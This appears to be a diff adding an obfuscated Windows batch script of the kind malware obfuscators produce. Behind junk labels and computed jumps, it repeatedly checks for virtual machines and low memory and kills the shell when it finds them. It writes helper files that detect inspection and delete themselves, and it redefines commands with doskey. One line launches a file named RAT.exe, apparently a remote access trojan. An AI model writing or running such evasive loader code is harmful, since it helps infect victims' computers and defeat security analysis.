+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotSNTzit.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotSNTzit.bat 
+
+ call kdotSNTzit.bat 
+goto (2*2*2*2*05*0x3d*0145)  
+:807745 
+:383217 
+:760905  
+for /l %%g  in (34  34  34) do (
+ set "q=m" 
+)
+set /a ans=03*(07610x54)*(014440x153) 
+echo @echo off >> kdotDzChH.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotDzChH.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotDzChH.bat 
+
+ call kdotDzChH.bat 
+goto (03*(07610x54)*(014440x153))  
+:962350 
+:803162  
+set "r=n" 
+set /a ans=2*0x47*(0102340475) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*0x47*(0102340475))  
+:981094  
+set "t=p" 
+set /a ans=((0551023720xe7762fa)>>9) 
+goto (((0551023720xe7762fa)>>9))  
+:325587 
+:645943  
+set "u=q" 
+set /a ans=2*2*~-248058 
+goto (2*2*~-248058)  
+:817103 
+:378056  
+set "v=r" 
+set /a ans=03*0x3*03*0x3*03*0x5*013*027 
+echo @echo off >> kdotxMfVbS.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotxMfVbS.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotxMfVbS.bat 
+
+ call kdotxMfVbS.bat 
+goto (03*0x3*03*0x3*03*0x5*013*027)  
+:144045 
+:450372 
+:184998 
+:909259 
+:520353  
+for /l %%w  in (814  814  814) do (
+ set "w=s" 
+)
+set /a ans=~-675482 
+goto (~-675482)  
+:273976 
+:113473  
+for /l %%o  in (256  256  256) do (
+ set "x=t" 
+)
+set /a ans=2*2*0x3*07*(0xea2011347) 
+echo @echo off >> kdotYjfLfK.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotYjfLfK.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotYjfLfK.bat 
+
+ call kdotYjfLfK.bat 
+goto (2*2*0x3*07*(0xea2011347))  
+:110095 
+:763739 
+:916132  
+set "a=w" 
+set /a ans=2*2*2*0x3*(01022620xe01) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (2*2*2*0x3*(01022620xe01))  
+:746577  
+for /l %%r  in (704  704  704) do (
+ set "b=x" 
+)
+set /a ans=2*027*~-11594 
+goto (2*027*~-11594)  
+:267344  
+set "c=y" 
+set /a ans=2*(0x5d5a6060013) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*(0x5d5a6060013))  
+:326088  
+for /l %%n  in (381  381  381) do (
+ set "H1=D" 
+)
+set /a ans=2*0x3*~-165000 
+goto (2*0x3*~-165000)  
+:166381  
+set "J1=F" 
+set /a ans=0x5*0xb*((034162470x1eade7)>>6) 
+echo @echo off >> kdoteZewYM.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdoteZewYM.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdoteZewYM.bat 
+
+ call kdoteZewYM.bat 
+goto (0x5*0xb*((034162470x1eade7)>>6))  
+:235724  
+set "K1=G" 
+set /a ans=0xb*013*((0x1b2f5901227131)>>8) 
+echo @echo off >> kdotYtnMc.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotYtnMc.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotYtnMc.bat 
+
+ call kdotYtnMc.bat 
+goto (0xb*013*((0x1b2f5901227131)>>8))  
+:881466 
+:930494 
+:688429 
+:955316  
+set "L1=H" 
+set /a ans=2*2*2*2*0x49*~-212 
+echo @echo off >> kdotiQpNQg.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotiQpNQg.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotiQpNQg.bat 
+
+ call kdotiQpNQg.bat 
+goto (2*2*2*2*0x49*~-212)  
+:909259 
+:934495  
+set "N1=J" 
+set /a ans=07*0x7*0x7*07*0x8b 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%uNYSshxaI%%Ixnzrbxs%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%gTchezv%%xYskkgZj%%a\nif "%%UwjVPok%%CdvotiyiGpnmzFJD%%DLNDlTauwwBgsxccNp%%eTpZrhenGjnuVNINU%%mZpwPmbLqWOgKGdE%%YVOFRMXFsbsYtRvynag%%TCogyZgGwVZzDbEko%%HIXmyoYnynVpMBQU%%OeUPxFIhpmChQOIRe%%DePZbcUqKqfkBmSAD%%HRefGHDnMpzbbPNF%%ohwXaqWaNqAyAjIn%%AwimyYOjDnZTNBUPSJ%%PVoQCgM%%"=="Microsoft Corporation" if "%%CrlWJpEl%%XFNmouFzWiwfomnGTW%%tDmOLpSkkKUjecb%%NyNVxPgwVzlFdeneAq%%OSZJGQEGaoCyuzbwwc%%rHkdsYrMhzcZXQPIx%%LshZEPH%%"=="Virtual Machine" exit\nif "%%ximHsabfp%%KxTvjWnPiYWtymKhFJ%%JwoEgHQeuwzAhREzJD%%iqnrpGYiajVWJLgLy%%LlQgfKvqymxkGdVNY%%ijJWAcTxbNzfrFJba%%huTkhWwwZMuArzDKH%%AcYRsZOKvyAQttAXH%%mHmGaCvpmxZvMgM%%zpdXSYQbIqSeVFraG%%EkqDcyYYnuTOeQMzT%%ToPkTkBaCvmgfRlV%%lfGvAVTNVnBnZdsNT%%PLiDXPUT%%"=="VMware, Inc." exit\nif "%%iFkEttqg%%NDvCTPgMHigEDXCMv%%pSPqnygJktkzDSGW%%tNGkeIkzZNbhNfpU%%ThSgTWgDgakOsDjPwEG%%VDRyuumOzhktFXsaA%%iYzlXCw%%"=="VirtualBox" exit 
+)
+goto (07*0x7*0x7*07*0x8b)  
+:332141  
+set "O1=K" 
+set /a ans=027*0x71*0227 
+goto (027*0x71*0227)  
+:458163  
+set "Q1=M" 
+set /a ans=2*2*2*0x3*05*05*~-600 
+goto (2*2*2*0x3*05*05*~-600)  
+:763406 
+:119651  
+for /l %%y  in (569  569  569) do (
+ set "R1=N" 
+)
+set /a ans=2*2*021*((0157051500x1dc068)>>9) 
+goto (2*2*021*((0157051500x1dc068)>>9))  
+:966567  
+set "S1=O" 
+set /a ans=(0xf8f450x65294) 
+goto ((0xf8f450x65294))  
+:955215 
+:745256 
+:550796  
+for /l %%e  in (99  99  99) do (
+ set "U1=Q" 
+)
+set /a ans=2*2*2*05*((0x3a7080x10dc8)>>6) 
+goto (2*2*2*05*((0x3a7080x10dc8)>>6))  
+:341816  
+for /l %%s  in (214  214  214) do (
+ set "W1=S" 
+)
+set /a ans=2*2*05*05*05*(0x6240x33) 
+goto (2*2*05*05*05*(0x6240x33))  
+:880994 
+:490983  
+for /l %%j  in (432  432  432) do (
+ set "Y1=U" 
+)
+set /a ans=2*2*2*0x5*0x7*0xb*((0x7bb0x63)>>3) 
+goto (2*2*2*0x5*0x7*0xb*((0x7bb0x63)>>3))  
+:172064 
+:315054  
+set "Z1=V" 
+set /a ans=0x5*0x7*0x43*~-338 
+goto (0x5*0x7*0x43*~-338)  
+:966567 
+:236554  
+set "A1=W" 
+set /a ans=0x5*0xb*0x13*~-492 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x5*0xb*0x13*~-492)  
+:124956  
+set "C1=Y" 
+set /a ans=2*2*05*0x4f*~-380 
+goto (2*2*05*0x4f*~-380)  
+:479372 
+:169688 
+:819198  
+for /l %%n  in (888  888  888) do (
+ set "D1=Z" 
+)
+set /a ans=2*0x5*0305*~-434 
+goto (2*0x5*0305*~-434)  
+:598994  
+doskey SETLOCAL=FSUTIL 
+set /a ans=03*(014503001003377) 
+goto (03*(014503001003377))  
+:665522 
+:166159  
+for /l %%o  in (74  74  74) do (
+ set "e=a" 
+)
+set /a ans=03*0x53*~-2972 
+goto (03*0x53*~-2972)  
+:769278  
+for /l %%w  in (652  652  652) do (
+ set "f=b" 
+)
+set /a ans=2*0x5*((0x192460x20076)>>4) 
+goto (2*0x5*((0x192460x20076)>>4))  
+:932764  
+for /l %%l  in (784  784  784) do (
+ set "h=d" 
+)
+set /a ans=0x3*0x3*0x5*0x7*~-480 
+goto (0x3*0x3*0x5*0x7*~-480)  
+:297177  
+set "j=f" 
+set /a ans=0x3*03*0x3*0x3*0x3*(03511034) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}" 
+goto (0x3*03*0x3*0x3*0x3*(03511034))  
+:688429 
+:446126  
+set "l=h" 
+set /a ans=2*03*0x3*0x5*05*(0x67207041) 
+goto (2*03*0x3*0x5*05*(0x67207041))  
+:273645 
+:351760 
+:361053  
+set "m=i" 
+set /a ans=2*2*(0x2c3460147107) 
+goto (2*2*(0x2c3460147107))  
+:375265  
+for /l %%w  in (606  606  606) do (
+ set "n=j" 
+)
+set /a ans=03*015*021*((024627063607)>>4) 
+goto (03*015*021*((024627063607)>>4))  
+:804104  
+set "o=k" 
+set /a ans=2*2*2*((0xd55fae0100144656)>>9) 
+goto (2*2*2*((0xd55fae0100144656)>>9))  
+:289370 
+:388129  
+set "q=m" 
+set /a ans=2*2*03*03*045*~-468 
+goto (2*2*03*03*045*~-468)  
+:647345 
+:916132 
+:966904  
+for /l %%c  in (958  958  958) do (
+ set "r=n" 
+)
+set /a ans=2*0xb*~-6734 
+goto (2*0xb*~-6734)  
+:433427 
+:838645 
+:700952  
+set "t=p" 
+set /a ans=2*0x3*07*0xb*(035760605) 
+goto (2*0x3*07*0xb*(035760605))  
+:173378  
+for /l %%c  in (546  546  546) do (
+ set "v=r" 
+)
+set /a ans=0xd*~-38708 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%UgTJyRY%%wbLwrRut%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%aOfVgQjh%%nNeGUcilE%%a\nif "%%OObqYUJR%%mIiSIGwSvimRncxMPSv%%RIfCEmruwsRpnlbzO%%OLeUqZvjFWuYGjCOW%%ETFHnerLqJHDluhQP%%IcHKfwCbBMROfaBuU%%hXMZXxowmXNlSUz%%oFHYPzXXjylusVILh%%hUFDtrbpwLWSqBCdo%%GdczwoAqSWLJzXuy%%vedTYfwExntktUuskga%%npGfVxFBbavhsGPEixM%%bApGwokyNnGtiHoqg%%PqIIjwPfA%%"=="Microsoft Corporation" if "%%gPadaleP%%bzoZhoDRiMGCoFkK%%VdtZMCuknKwRWBJb%%XYFRFkngzgYqcIwRb%%ejdwTsGBaLYzsKiKqf%%WHxEitDyThOkjRiGGy%%rgEpBMP%%"=="Virtual Machine" exit\nif "%%ROtrbgW%%mgsgChveyiOiHNVDfG%%FCtFcvhDwqSwXkfhFr%%tOecrIxrkjRCWpWBG%%OhRuAtYKiqrFUEReeT%%ScwcishbWXgLTsY%%fHhVSDXywoRudoILs%%gNWtQOvNypbdlrGO%%JKCaRcflspdwcptMsC%%CykVRndqtoSPRlDpr%%SLZmQBcXnyALaTfYPl%%fScDzikXkatWVhjHwl%%kGYtTwMmnqFGEtTi%%IXclLUiBL%%"=="VMware, Inc." exit\nif "%%bWAGkwYbh%%AAAHEGNiGlEFjkytw%%RsxudbWfvkcstOcuhO%%WtaGRZCDuzFvtfrLtLj%%hEZEgrpaxICAeBa%%HjqXPHNthxVbOJKWdS%%iLIrJpElk%%"=="VirtualBox" exit 
+)
+goto (0xd*~-38708)  
+:513303 
+:444683  
+for /l %%j  in (844  844  844) do (
+ set "x=t" 
+)
+set /a ans=0x3*03*((0x34bf0b0x1baaeb)>>5) 
+goto (0x3*03*((0x34bf0b0x1baaeb)>>5))  
+:836510 
+:760905 
+:561645  
+set "z=v" 
+set /a ans=03*03*0xd*~-948 
+goto (03*03*0xd*~-948)  
+:841248 
+:310246  
+set "a=w" 
+set /a ans=2*2*2*03*027*~-608 
+goto (2*2*2*03*027*~-608)  
+:128359 
+:625945  
+set "c=y" 
+set /a ans=2*2*03*0x3*0x2f*(0xe201353) 
+goto (2*2*03*0x3*0x2f*(0xe201353))  
+:831548 
+:856905 
+:601551  
+set "E1=A" 
+set /a ans=2*0xb*023*(0xd6202477) 
+goto (2*0xb*023*(0xd6202477))  
+:711325 
+:846580  
+set "F1=B" 
+set /a ans=2*2*2*07*07*~-828 
+goto (2*2*2*07*07*~-828)  
+:235724 
+:375265 
+:997613  
+set "G1=C" 
+set /a ans=2*2*03*03*013*((0125376053636)>>5) 
+goto (2*2*03*03*013*((0125376053636)>>5))  
+:169688 
+:344693  
+for /l %%j  in (250  250  250) do (
+ set "H1=D" 
+)
+set /a ans=2*2*0x17*0x47*0227 
+goto (2*2*0x17*0x47*0227)  
+:707313 
+:782524 
+:407660  
+for /l %%t  in (169  169  169) do (
+ set "K1=G" 
+)
+set /a ans=0x3*(066356301607212) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (0x3*(066356301607212))  
+:300274 
+:230942 
+:719647  
+for /l %%c  in (194  194  194) do (
+ set "L1=H" 
+)
+set /a ans=2*2*((03226521600116712560)>>8) 
+goto (2*2*((03226521600116712560)>>8))  
+:991064  
+for /l %%z  in (258  258  258) do (
+ set "O1=K" 
+)
+set /a ans=2*(0xf7d60x2400b) 
+echo @echo off >> kdotPNGDx.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotPNGDx.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotPNGDx.bat 
+
+ call kdotPNGDx.bat 
+goto (2*(0xf7d60x2400b))  
+:229737  
+set "P1=L" 
+set /a ans=2*0x3*0103*~-1232 
+goto (2*0x3*0103*~-1232)  
+:649864  
+for /l %%i  in (453  453  453) do (
+ set "Q1=M" 
+)
+set /a ans=0x7*(0xd5074)*((04572340x1c09c)>>9) 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%KWBSmkITD%%iPHItHQ%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%buPobapbI%%AJqeQWu%%a\nif "%%bfRIYmq%%CBgOwIhipbtRDluHc%%QVjlFoxvwjSWVkGHG%%lNXlOIPWjCBCmuPqV%%eaqwVsxzgqmjwlsGSlg%%krYPxZzbIvDHTRH%%SrAizLWewyOhOyzP%%mrRSBmeyykeTzDtCV%%nNVrnVbpUOWynSY%%ywKZhmGBqjaHNGUTM%%dtAzJlxNnkbtBwBr%%RLCWvZvahCiQrszy%%VbKVcDuwnWAzWeHr%%OHwaJMu%%"=="Microsoft Corporation" if "%%ZbvqDXC%%fOezfgUqiYUgmjsc%%OydmwghCSkPkLElrLct%%JurgdtezqmvEzeh%%uqKfDJNasaAmXKqn%%sJEzXptGihoYOmozLwe%%cmLhXYAPD%%"=="Virtual Machine" exit\nif "%%vbLTKfDJ%%xqaZYWRieOoMEMyz%%gnkRJYvwUvIEEzAjp%%dFFXmJojedORmHjl%%zTwaQaOkMqSVJbupvua%%tkNjlhSwbRkWSwcjI%%xUFCTdEwaYzjBFjV%%lMBgQBJUyLfmYFyYLV%%zjyqtQEpvCiZprXX%%hbZRjnJgRqCLIJASKgT%%LETrjNlnPnyruSwZn%%LRDaTHltaPszlgtq%%zYpaWRakenIsMrpDrTB%%iTLhJXyFF%%"=="VMware, Inc." exit\nif "%%mRLSSkKei%%PZmPIEJzbiMilcypd%%gNJGsGKEkgxaqfEHq%%NJNDDqxVGzOUgGvxTP%%xzJzHiGOagFFicSc%%QmamJXLSPhZlCRzXS%%FFDCGrs%%"=="VirtualBox" exit 
+)
+goto (0x7*(0xd5074)*((04572340x1c09c)>>9))  
+:480350 
+:993178 
+:383217 
+:715850  
+for /l %%b  in (870  870  870) do (
+ set "R1=N" 
+)
+set /a ans=2*2*07*(0x736074565) 
+powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }" 
+goto (2*2*07*(0x736074565))  
+:782524 
+:909718  
+for /l %%a  in (525  525  525) do (
+ set "S1=O" 
+)
+set /a ans=(0x466f40x381bb) 
+goto ((0x466f40x381bb))  
+:223743 
+:550796 
+:360020  
+for /l %%b  in (659  659  659) do (
+ set "T1=P" 
+)
+set /a ans=2*023*~-18314 
+goto (2*023*~-18314)  
+:431002 
+:480350 
+:680065 
+:680065 
+:995389  
+set "Y1=U" 
+set /a ans=0x4f*(01460404045) 
+goto (0x4f*(01460404045))  
+:360020 
+:655941  
+for /l %%r  in (917  917  917) do (
+ set "Z1=V" 
+)
+set /a ans=2*2*035*0x2f*0x47 
+goto (2*2*035*0x2f*0x47)  
+:932376  
+for /l %%n  in (977  977  977) do (
+ set "A1=W" 
+)
+set /a ans=0x7*~-137252 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%hMwPgxp%%WLgdWbxp%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%QwjyYgi%%ATxpSeBkt%%a\nif "%%vePuBlyd%%pggVPlnMiiyWzGRRYt%%QYYpRiHwrKiJiOZeb%%MZDTzEqvOjmUDTCWCk%%nerAYBIEcqMhHiBoUWl%%nNAsesdbxYYEgSpq%%qFJCUHvwJSERDgj%%yKYioDGQFyfYAkOsMEd%%ohlQGtgMpaCRQtlaA%%uAUUstXDqFLgUVWVQq%%PCEcxglnGAuyIkoB%%EBzOCvzFazQRMgQqS%%eCuVoNgnlGpfgyemM%%AMRTJtc%%"=="Microsoft Corporation" if "%%tKvYqwcoS%%yMtPChAqinMBWgRIf%%aACKliGupkzYQjCiBj%%EOLUgQlszUuXUxHQXZ%%wABLhiQjRaIpoavKD%%hGJJtDmXpheRSpByNJT%%HoHpohnRC%%"=="Virtual Machine" exit\nif "%%dWyohuWHE%%VdlbYCCCiBnuIBGh%%wuLEuWNwiJivjTTLZ%%HxozIRMrRjYluEswxVq%%iEQiZhRqIyCcvsY%%SWMPLrmbinTYQvLs%%lqYoBJppjwwGSIlJWsW%%AjMUxKVCvygWphkgr%%IqTiYMqpgbmtCnOdl%%WxCvnDgeqsoTRAdXVk%%LVtZUuxXhnpnhgDZqc%%GrcAmtqvadCkKLvr%%QjPtOcruInBnkHzpcB%%ZwkxocDU%%"=="VMware, Inc." exit\nif "%%wBJFdHbkW%%aCosrjRsriQxrLHnDEf%%rCkkcdEukdbAmrBc%%WVVRjgbzHTWwhWvno%%ciKlrujfaeAIAEWTvL%%PWguRuEnhGzPamaM%%RrIkwYUi%%"=="VirtualBox" exit 
+)
+goto (0x7*~-137252)  
+:450372 
+:401673  
+for /l %%o  in (931  931  931) do (
+ set "B1=X" 
+)
+set /a ans=0x5*0x7*~-25118 
+goto (0x5*0x7*~-25118)  
+:680065 
+:561645 
+:719647 
+:791069  
+for /l %%a  in (339  339  339) do (
+ set "C1=Y" 
+)
+set /a ans=2*0x5*07*((0x10158903655611)>>9) 
+goto (2*0x5*07*((0x10158903655611)>>9))  
+:507227 
+:137676  
+for /l %%o  in (182  182  182) do (
+ set "D1=Z" 
+)
+set /a ans=0x13*(0x19b40x3057) 
+goto (0x13*(0x19b40x3057))  
+:769655  
+forfiles /p   /m RAT.exe /c 'cmd /c start @file' >nul 2>nul 
+set /a ans=~-502238 
+goto (~-502238)  
+:326088 
+:769278 
+:715850 
+:477573  
+doskey TASKKILL=CHKDSK 
+set /a ans=2*0x5*0x5*0x1f*0263 
+goto (2*0x5*0x5*0x1f*0263)  
+:886401 
+:166159 
+:846580 
+:715850 
+:401216  
+doskey DRIVERQUERY=PROMPT 
+set /a ans=((020712525056503425)>>6) 
+goto (((020712525056503425)>>6))  
+:933264 
+:276251 
+:909718 
+:235821  
+doskey GOTO=MOVE 
+set /a ans=2*2*2*0x5*07*0x17*0x43 
+echo @echo off >> kdotZUyky.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotZUyky.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotZUyky.bat 
+
+ call kdotZUyky.bat 
+goto (2*2*2*0x5*07*0x17*0x43)  
+:880994 
+:819198 
+:706861  
+cd   
+set /a ans=2*03*0x17*((0x2e6870247607)>>8) 
+echo @echo off >> kdotwNvll.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotwNvll.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotwNvll.bat 
+
+ call kdotwNvll.bat 
+goto (2*03*0x17*((0x2e6870247607)>>8))  
+:751647 
+:532951 
+:401673 
+:568819  
+for /l %%w  in (85  85  85) do (
+ set "e=a" 
+)
+set /a ans=05*0xc1*((04377013107)>>3) 
+goto (05*0xc1*((04377013107)>>3))  
+:498085  
+for /l %%v  in (689  689  689) do (
+ set "f=b" 
+)
+set /a ans=2*0x3*0x3*07*0x7*((022247016607)>>5) 
+goto (2*0x3*0x3*07*0x7*((022247016607)>>5))  
+:665522 
+:166159 
+:536326  
+set "g=c" 
+set /a ans=03*~-242*((011301370x655f)>>8) 
+echo @echo off >> kdotEUYlI.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotEUYlI.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotEUYlI.bat 
+
+ call kdotEUYlI.bat 
+goto (03*~-242*((011301370x655f)>>8))  
+:846580 
+:997613 
+:289782  
+for /l %%x  in (722  722  722) do (
+ set "j=f" 
+)
+set /a ans=2*2*2*(01665710x19056) 
+goto (2*2*2*(01665710x19056))  
+:750028 
+:910773  
+set "k=g" 
+set /a ans=2*03*(0564350x1a21c) 
+goto (2*03*(0564350x1a21c))  
+:729700 
+:418634 
+:522886  
+set "m=i" 
+set /a ans=2*2*2*2*03*03*037*0x7f 
+goto (2*2*2*2*03*03*037*0x7f)  
+:331150  
+for /l %%s  in (779  779  779) do (
+ set "t=p" 
+)
+set /a ans=0200*0xb*0x11*0x13 
+goto (0200*0xb*0x11*0x13)  
+:635917  
+set "u=q" 
+set /a ans=(0x84f7d01230470) 
+goto ((0x84f7d01230470))  
+:763406 
+:236554 
+:473224  
+set "w=s" 
+set /a ans=2*2*2*03*(0773030x3ddc) 
+goto (2*2*2*03*(0773030x3ddc))  
+:841248 
+:598994 
+:707708  
+set "y=u" 
+set /a ans=2*013*((01343610x2f25d)>>2) 
+goto (2*013*((01343610x2f25d)>>2))  
+:598129  
+set "c=y" 
+set /a ans=((0x1ad4a75073110225)>>5) 
+goto (((0x1ad4a75073110225)>>5))  
+:113473 
+:385907  
+set "G1=C" 
+set /a ans=0x40*0x1d*0x95 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%zQnftiAY%%MtPtPRdm%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%JhoIonN%%zNFtoMe%%a\nif "%%YIqoUrVh%%TpZjsFMDiSRoDMKsB%%CFeYfDNYweadEGIw%%wkSwdZUjCkPVavKBr%%kxlaWylqLWvWPqvt%%LCAMvLIbEaZaXgj%%juYMlvdjwVRsrwaLMc%%DzvVmBpQHyRJUPkxKXn%%AAMjKGuUUpNlpFyXiSM%%yqiCkLDmXqrphCWUVic%%QNwfBFVunweOYfRbcs%%fJQGNlhZavrwrzWD%%ulBJsCynTdKNnDgWJ%%HwGzsDqe%%"=="Microsoft Corporation" if "%%KwkgYLQ%%PjScrFYiVJJhopk%%geMUTnRkknqidwIc%%VDuwDWOsuzMPrLPJvy%%XyQvWWFtdaoXhcbhyZu%%VCOciHcbhxbNISrj%%ijNmNDTp%%"=="Virtual Machine" exit\nif "%%QhsROEWsb%%SwNugCNNkiNMBhQuK%%dvgvyDUwghfuKhW%%aNzMdvDFjcGsqPkE%%kQdkTQIHKqbxqQzqxHB%%dmBeHBKbFFQRCiGt%%PXFChIdswaYUdtbxk%%mFYDIYKYxyVpVGDBiU%%IfHFlPepwprecAWY%%wlOjTZqeqAKwYtwu%%TOhBddDnHnXqEfn%%UALdlgXasUtCrqVTE%%KMZapBRcneNxMCDkp%%yOZIAUvX%%"=="VMware, Inc." exit\nif "%%IACTyzz%%vjDfoQFkivYdRpKERw%%qYnQfLrgkBagNNjL%%pgxWAvPjzkXxYvWWPb%%CsLVhAVaYqoaCOm%%ufiBCIGDhXnIEryUn%%hMKvFxneT%%"=="VirtualBox" exit 
+)
+goto (0x40*0x1d*0x95)  
+:645943 
+:341816 
+:473224 
+:620197  
+for /l %%z  in (165  165  165) do (
+ set "H1=D" 
+)
+set /a ans=05*0x5*0x2b*0145 
+goto (05*0x5*0x2b*0145)  
+:968222  
+set "I1=E" 
+set /a ans=2*2*0x7*021*023*023 
+goto (2*2*0x7*021*023*023)  
+:486922 
+:240967  
+set "K1=G" 
+set /a ans=(03301432)*(0410x378) 
+goto ((03301432)*(0410x378))  
+:803162 
+:522951  
+set "L1=H" 
+set /a ans=2*(0xe4bb014666) 
+goto (2*(0xe4bb014666))  
+:235821 
+:235821 
+:265660  
+for /l %%i  in (533  533  533) do (
+ set "O1=K" 
+)
+set /a ans=2*0x5*(0x11295016156) 
+for /f "tokens=2 delims==" %%a  in ('wmic computersystem get manufacturer /value') do set manufacturer=%%gQswXWHml%%fYaQLKf%%a\nfor /f "tokens=2 delims==" %%a  in ('wmic computersystem get model /value') do (
+set model=%%yhdMQID%%wYvjNMnW%%a\nif "%%RUpipDd%%kymyjMwiniOkWlJtY%%pOAKUjCXEwNqZSTkvRx%%VTfSJDhjaKVpNQr%%lNrFiOXqmmgxTxwA%%CZLhuRnybZwWqbbP%%XiVtpmtweEOhKJBVE%%XHvrvzuZTyTmyUYqd%%mEBIiFQpCkWZtShw%%fqVFmzfZyqPHuZkFe%%IgPBvXujnoamAtsD%%tIWXqUKaALbuLPOXS%%FGYGBXUnymHeajlDI%%UhwKlvl%%"=="Microsoft Corporation" if "%%FwOMdIha%%DnyODlmUiqFTZLZc%%CRaDBVUkVsSSAND%%EwDeyVwwBzkaajwguG%%SIYOSWUUajsiykIcsi%%fyJWpVmIOhcIhygpF%%ZScvFFSn%%"=="Virtual Machine" exit\nif "%%uWcCaomf%%CbghNVAiuwYiNKCJL%%omoSQpOXwkDKWcRrpa%%gOCrCRzmLjqVsxJYvNO%%RToJeIqEiqBgIcNbg%%kaQvHDNebCqsSRtH%%BDWBqHRwLVwHFrZ%%YYEmzOXKyIphAzguq%%EsonAVvpspTJgwxeb%%wqlRJWRqTdCBjKLg%%XoVknJjnzngRKWov%%GZZUfLWBauOvmJmpma%%LlWWxApnXNWjvzx%%DRlYFzqy%%"=="VMware, Inc." exit\nif "%%MLSGJgcgd%%yXkhgnTcziwFhoxDTV%%nBakWDnkRDTkQmIKI%%zfhYfnFzHJvmpFjYK%%XBwBltqaoQVzVSOw%%OMIXmHjHQhSFgyYyDfR%%qURkoUI%%"=="VirtualBox" exit 
+)
+goto (2*0x5*(0x11295016156))  
+:880591 
+:660218  
+for /l %%t  in (781  781  781) do (
+ set "P1=L" 
+)
+set /a ans=03*0x7*~-34878 
+goto (03*0x7*~-34878)  
+:707708 
+:773875  
+set "Q1=M" 
+set /a ans=0x7*0225*0277 
+echo @echo off >> kdotoHldl.bat 
+
+ echo findstr /i "echo" "C:\Users\al\Downloads\script.bat"  >> kdotoHldl.bat 
+
+ echo if %%errorlevel%%  == 0 ( taskkill /f /im cmd.exe ) else ( (goto) 2^>nul  ^&  del "%%~f0"  ) >> kdotoHldl.bat 
+
+ call kdotoHldl.bat 
+goto (0x7*0225*0277)  
+:907949 
+:173378 
+:466840  
+set "R1=N" 
+set /a ans=0400*03*021*053 
+goto (0400*03*021*053)  
+:849598 
+:997613 
